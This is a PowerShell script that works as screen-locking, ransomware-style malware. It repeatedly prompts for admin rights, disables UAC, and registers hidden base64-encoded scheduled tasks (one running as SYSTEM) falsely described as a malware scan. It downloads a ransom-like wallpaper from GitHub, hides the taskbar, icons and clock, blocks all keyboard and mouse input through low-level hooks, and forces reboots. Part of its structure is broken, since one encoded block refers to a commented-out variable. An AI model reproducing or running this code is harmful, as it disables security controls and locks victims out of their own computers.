$scriptBlock10={
    New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
   
  #  $scriptBlock20=@'
        #god do
        #check for background and stuff
        # user do
        $scriptBlock1={

            #execute to user
            Stop-Process -f -ProcessName explorer
            #execute stuff for the background
            #Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
            #execute stuff for the background
            $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
            # Loop through each SID and perform an action (for example, display the SID name)
            foreach ($sid in $sidKeys) {

                Write-Host "Processing SID: $($sid.Name)"
                $ID=$sid.Name
                $wall=(Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
                if(-not($wall -match "pr.jpg")){

                    Write-Output "not effective"
                    $sidk = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
                    foreach ($s in $sidk) {
                        # Action you want to perform on each SID
                        $ID=$s.Name
                        (Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
                        Set-ItemProperty -Path "Registry::$ID\Control Panel\Desktop" -Name Wallpaper -Value "C:\pr.jpg"

                        Set-ItemProperty -Path "Registry::$ID\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
                        Control Panel\Desktop
                        Set-ItemProperty -Path "Registry::$ID\Control Panel\Desktop" -Name "WallpaperStyle" -Value 2

                        $p="Registry::$ID\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3";
                        $v=(Get-ItemProperty -Path $p).Settings;
                        $v[8]=3; #2 to unhide
                        Set-ItemProperty -Path $p -Name Settings -Value $v;
                        

                        $regPath = "Registry::$ID\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
                        if (-not (Test-Path $regPath)) {
                            New-Item -Path $regPath -Force
                        }
                        Set-ItemProperty -Path $regPath -Name "TaskbarNoNotification" -Value 1 #0
                        Set-ItemProperty -Path $regPath -Name "NoToolbarsOnTaskbar" -Value 1 #0
                        Set-ItemProperty -Path $regPath -Name "HideClock" -Value 1 #0
                        Set-ItemProperty -Path $regPath -Name "NoTrayItemsDisplay" -Value 1 #0
                        Remove-Item "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" -Recurse -Force
                        Stop-Process -f -ProcessName explorer


                        Restart-Computer -Force -Confirm:$false 
                    }
                }
                else{
                Write-Output "already effective"
                }
            }
            Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
        }
        #god do
        $encodedCommand2= [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock1.ToString()))
        $condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
        $action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand2"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
        # Loop through each SID and perform an action (for example, display the SID name)
        foreach ($sid in $sidKeys) {


            Write-Host "Processing SID: $($sid.Name)"
            $string = $sid.Name
            $modifiedString = $string -replace '^[^\\]+\\', ''
            $taskName = "FileSystem $modifiedString"
            $task = Get-ScheduledTask | Where-Object {$_.TaskName -eq $taskName}
            if ($task) {
                Write-Host "Task '$taskName' exists."
            
            } 
            else {
                $Principal = New-ScheduledTaskPrincipal -UserId $modifiedString -LogonType Interactive -RunLevel Highest
                Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "FileSystem $modifiedString" -Description "Scan for malicious file in the system" -Principal $Principal -Force 
                Write-Output "here"
                Start-ScheduledTask -TaskName "FileSystem $modifiedString"
            }
        }
#'@

    #creation of god
    $encodedCommand20=$encodedCommand20 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock20.ToString()))
    $condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
    $action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand20"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM"  -RunLevel Highest
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "god" -Description "Scan for malicious file in the system" -Principal $Principal -Force 


    #install the backgroud
    $1="https://raw.githubusercontent.com/Desnyt628/download/refs/heads/main/runsomehair.png"
    $2="C:\pr.jpg" 
    Invoke-WebRequest -Uri $1 -OutFile $2


    Restart-Computer -Force -Confirm:$false #important
}


#start the process
$encodedCommand1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock10.ToString()))
while(1){
#ask in loop for autorisation
Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommand1" -Verb RunAs -Wait -WindowStyle Hidden
}
